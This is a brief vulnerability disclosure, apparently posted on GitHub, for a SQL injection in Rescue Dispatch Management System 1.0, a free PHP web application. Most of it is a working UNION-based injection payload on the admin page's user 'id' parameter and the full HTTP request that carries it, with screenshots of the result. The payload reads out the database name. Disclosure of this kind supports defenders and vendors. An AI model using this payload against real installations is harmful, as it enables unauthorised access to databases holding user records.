# Rescue Dispatch Management System 1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File: \rdms\admin\?page=user\manage_user&id=

Vulnerability location: /cms/rdms/admin/?page=user/manage_user&id=, id

[+] Payload: ip/rdms/admin/?page=user/manage_user&id=-3%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+

```sql
GET /rdms/admin/?page=user/manage_user&id=-3%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

![image](https://user-images.githubusercontent.com/106288109/170442341-96e25eb9-66b0-4bd0-8c45-e4d23cd280cd.png)

![image](https://user-images.githubusercontent.com/106288109/170442083-3988f823-1555-4f50-bcd9-74b953cef85a.png)
